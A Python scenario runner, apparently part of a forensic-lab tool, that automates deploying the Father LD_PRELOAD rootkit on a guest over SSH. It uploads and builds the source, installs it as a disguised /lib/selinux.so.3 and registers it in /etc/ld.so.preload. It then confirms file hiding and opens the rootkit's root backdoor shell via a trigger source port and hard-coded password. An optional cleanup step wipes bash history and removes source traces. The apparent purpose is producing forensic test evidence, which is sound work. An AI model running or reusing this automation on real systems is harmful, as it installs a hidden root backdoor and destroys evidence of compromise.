"""Explicit runner for the Father LD_PRELOAD scenario."""

from __future__ import annotations

import socket
from pathlib import Path

import yaml

from orchestrator.core import console
from orchestrator.core.provenance import file_sha256
from orchestrator.core.ssh_client import SSHClient
from scenarios.command_log import record_operation, run_logged_command

SCENARIO_ID = "userland_father_ldpreload"
CLEANUP_SCENARIO_ID = "userland_father_ldpreload_cleanup"
ROOT = Path(__file__).resolve().parent
ARCHIVE = ROOT / "files/father-upstream-4eb2712.tar"
LOCK = ROOT / "father.lock.yml"

REMOTE_ROOT = "/tmp/forensic-lab/father_ldpreload"
UPLOAD_PATH = "/tmp/father-upstream-4eb2712.tar"

# Father defaults
INSTALLED_LIBRARY = "/lib/selinux.so.3"
PRELOAD_CONFIG = "/etc/ld.so.preload"
SOURCE_PORT = 54321
SHELL_PASSWORD = b"lobster\0"
AUTHENTICATION_PROMPT = b"\n\nAUTHENTICATE: "
SHELL_MARKER = b"Enjoy the shell!"

# Only intentional Father customization
HIDDEN_PREFIX = "__malicious_"
HIDDEN_FILE_NAME = f"{HIDDEN_PREFIX}file"
LIST_HIDDEN_DIR = 'ls -la -- "$hidden_dir"'

PREPARE_AND_BUILD_COMMANDS = (
    f"root={REMOTE_ROOT}; "
    'source="$root/Father-4eb2712caf612a7dc55fd4f34ff5c72b74c7c332"; '
    'hidden_dir="$root/probe"',
    'mkdir -p "$hidden_dir"',
    f'tar -xf {UPLOAD_PATH} -C "$root"',
    f"sed -i 's|^#define STRING .*|#define STRING "
    f'"{HIDDEN_PREFIX}"|\' "$source/src/config.h"',
    'cd "$source" && make father',
)

CLEANUP_COMMANDS = (
    f"rm -f -- {UPLOAD_PATH}",
    'rm -rf -- "$source"',
    "history -c",
    'rm -f -- "${HISTFILE:-$HOME/.bash_history}"',
    "unset HISTFILE",
)


def run_father(
    ssh: SSHClient,
    transcript_path: Path,
    *,
    command_log_path: Path,
    scenario_id: str,
) -> tuple[dict, socket.socket]:
    """Run Father visibly in Bash, then validate its native accept-hook shell."""
    if scenario_id not in (SCENARIO_ID, CLEANUP_SCENARIO_ID):
        raise ValueError(f"Unsupported Father scenario: {scenario_id}")

    cleanup = scenario_id == CLEANUP_SCENARIO_ID
    transcript_path.touch()
    console.scope("HOST", "stage Father source")
    source = _verify_source(command_log_path)
    _upload_archive(ssh, command_log_path)

    terminal = ssh.open_terminal()
    cleanup_facts = {}
    backdoor_socket = None

    def close_backdoor_socket() -> None:
        nonlocal backdoor_socket
        if backdoor_socket is None:
            return
        backdoor_socket.close()
        backdoor_socket = None

    try:
        with terminal:
            console.scope("GUEST", "prepare and build")
            for command in PREPARE_AND_BUILD_COMMANDS:
                run_logged_command(terminal, command_log_path, command, timeout=180)

            console.scope("GUEST", "install and activate")
            for command in (
                f'sudo -n install -m 0644 "$source/rk.so" {INSTALLED_LIBRARY}',
                f'touch "$hidden_dir/{HIDDEN_FILE_NAME}"',
            ):
                run_logged_command(terminal, command_log_path, command, timeout=180)

            visible_listing = run_logged_command(
                terminal, command_log_path, LIST_HIDDEN_DIR, timeout=180
            ).combined_output
            if HIDDEN_FILE_NAME not in visible_listing:
                raise RuntimeError("Controlled file was not visible before activation")

            for command in (
                f"printf '%s\\n' {INSTALLED_LIBRARY} "
                f"| sudo -n tee {PRELOAD_CONFIG}",
                "sudo -n systemctl restart ssh.service",
            ):
                run_logged_command(terminal, command_log_path, command, timeout=180)

            console.scope("GUEST", "validate behavior")
            hidden_listing = run_logged_command(
                terminal, command_log_path, LIST_HIDDEN_DIR, timeout=180
            ).combined_output
            if HIDDEN_FILE_NAME in hidden_listing:
                raise RuntimeError("Controlled file remained visible after activation")

            console.scope("HOST", "validate Father backdoor")
            try:
                identity, backdoor_socket = _validate_backdoor(ssh)
            except Exception as exc:
                record_operation(command_log_path, "validate_backdoor", error=str(exc))
                raise
            record_operation(command_log_path, "validate_backdoor")

            if cleanup:
                console.scope("GUEST", "cleanup treatment")
                for command in CLEANUP_COMMANDS:
                    run_logged_command(
                        terminal,
                        command_log_path,
                        command,
                        timeout=180,
                    )
                cleanup_facts = {
                    "cleanup": {
                        "archive_absent": True,
                        "source_tree_absent": True,
                        "home_bash_history_absent": True,
                        "preload_config_present": True,
                        "installed_library_present": True,
                    }
                }
    except BaseException:
        close_backdoor_socket()
        raise
    finally:
        try:
            transcript_path.write_text(terminal.transcript, encoding="utf-8")
        except BaseException:
            close_backdoor_socket()
            raise

    try:
        facts = {
            "source": source,
            "installed_library_path": INSTALLED_LIBRARY,
            "preload_config_path": PRELOAD_CONFIG,
            "hidden_file_path": f"{REMOTE_ROOT}/probe/{HIDDEN_FILE_NAME}",
            "file_hiding_validated": True,
            "backdoor_identity": identity,
            "backdoor_connection_open_at_scenario_completion": True,
            "trigger_source_port": SOURCE_PORT,
            "listener_service": "sshd",
            "listener_port": ssh.port,
        }
        facts.update(cleanup_facts)
        assert backdoor_socket is not None
        return facts, backdoor_socket
    except BaseException:
        close_backdoor_socket()
        raise


def _verify_source(command_log_path: Path) -> dict:
    try:
        lock = yaml.safe_load(LOCK.read_text(encoding="utf-8"))
        archive_hash = file_sha256(ARCHIVE)
        expected_hash = lock["retrieval"]["archive_sha256"]
        if archive_hash != expected_hash:
            raise RuntimeError(
                "Father archive SHA-256 mismatch: "
                f"expected {expected_hash}, got {archive_hash}"
            )
    except Exception as exc:
        record_operation(command_log_path, "verify_source", error=str(exc))
        raise

    source = {
        "repository": lock["upstream"]["url"],
        "commit": lock["upstream"]["pinned_commit"],
        "archive_sha256": archive_hash,
    }
    record_operation(command_log_path, "verify_source")
    console.ok(f"Father source verified: {archive_hash}")
    return source


def _upload_archive(
    ssh: SSHClient,
    command_log_path: Path,
) -> None:
    console.step(f"Uploading {ARCHIVE.name} to {UPLOAD_PATH}...")
    try:
        ssh.put(ARCHIVE, UPLOAD_PATH)
    except Exception as exc:
        record_operation(command_log_path, "upload_archive", error=str(exc))
        raise
    record_operation(command_log_path, "upload_archive")


def _validate_backdoor(
    ssh: SSHClient,
) -> tuple[str, socket.socket]:
    console.step(
        f"Connecting to {ssh.host}:{ssh.port} from Father trigger port "
        f"{SOURCE_PORT}..."
    )
    client = None
    try:
        client = socket.create_connection(
            (ssh.host, ssh.port),
            timeout=12,
            source_address=("", SOURCE_PORT),
        )
        with client.makefile("rb") as response:
            response.read(len(AUTHENTICATION_PROMPT))
            client.sendall(SHELL_PASSWORD)
            if not any(SHELL_MARKER in line for line in response):
                raise RuntimeError("Father did not open the native shell")

            client.sendall(b"id\n")
            identity = next(
                (
                    line.decode(errors="replace").strip().removeprefix("\x1b[0m")
                    for line in response
                    if b"uid=0(root)" in line and b"gid=1337" in line
                ),
                None,
            )
        if identity is None:
            raise RuntimeError("Father shell did not return the expected root identity")
        console.ok(f'Father shell opened: "{SHELL_MARKER.decode()}"')
        console.ok(f"Father shell identity: {identity}")
        return identity, client
    except OSError as exc:
        if client is not None:
            client.close()
        raise RuntimeError(f"Father backdoor connection failed: {exc}") from exc
    except BaseException:
        if client is not None:
            client.close()
        raise
